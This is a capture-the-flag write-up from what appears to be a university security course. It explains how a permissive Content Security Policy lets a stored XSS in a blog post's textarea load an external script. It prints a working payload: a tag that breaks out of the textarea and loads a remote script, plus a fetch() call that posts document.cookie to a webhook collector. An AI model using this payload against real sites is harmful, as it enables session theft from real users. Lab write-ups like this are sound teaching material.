# Challenge `Read my lips: No more scripts!` writeup

- Vulnerability:
  - _Endpoint has a **Cross Site Scripting (XSS)** vulnerability_
- Where:
  - _When writing the content, it will be displayed in a `<textarea>` endpoint. Although it has Content Security Policy, the implemented policy allows script tags with src from any source (script-src *)_
- Impact:
  - _Allows to **obtain the admin's cookies** by injecting malicious code in the content part of a blogpost_

## Steps to reproduce

First we connected to the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22254`. We can see that now the server allows anyone to submit new blogposts. Looking further, we make a 'test' post, and check the source code of the page. 
We can see that the content of the post is being displayed in a `<textarea>` tag. However, this site has Content Security Policy implemented. 

Analyzing the policy `script-src *`, we conclude that the filters allow script tags with the src equal to any source! This means that the server is  vulnerable to **XSS**. Here is where the content is displayed:

```html
<textarea class="form-control" name="content" id="contentArea" rows="10" >Here is where the content is displayed...</textarea>
```

Having found a way to inject code in the page, we will lure the admin to perform a request to the site where we are collecting the cookies. Since we did not have any site of our own we used a online service to collect our https requests [Webhook](https://webhook.site/). 

Now we also need a website to host our payload. We opted to use sigma since its easy and quick to implement. First login with your credentials: `ssh sigma.ist.utl.pt -l istxxxxxx`

Then we used the directory `/web`, and added a file with our malicious payload, getting the following website: `https://web.tecnico.ulisboa.pt/ist195674/read_my_lips_no_more_scripts.js`

The malicious payload in the javascript file is a fetch() to our webhook site, with the cookie as the body of the request:
```javascript
fetch('https://webhook.site/a0e83e7e-be55-4740-8180-f38200e300ea', {method: 'POST',mode: 'no-cors',body:document.cookie});
```
The final step is to insert the payload in the `src` we are going to send.

```html
</textarea><script type="text/javascript" src="https://web.tecnico.ulisboa.pt/ist195674/read_my_lips_no_more_scripts.js"></script></textarea>
```

This will only be effective when we choose to send it using the following button: `Update post and send it for admin review`.

As soon as the admin **'clicked the link',** we received the following cookie in the http request on our website:
```SECRET=SSof{R3m0t3_Scripts_are_allowed_with_this_CSP}```

Now, we were able to store the request in a website we control and therefore have possession of the admin's cookie obtaining the **flag**.
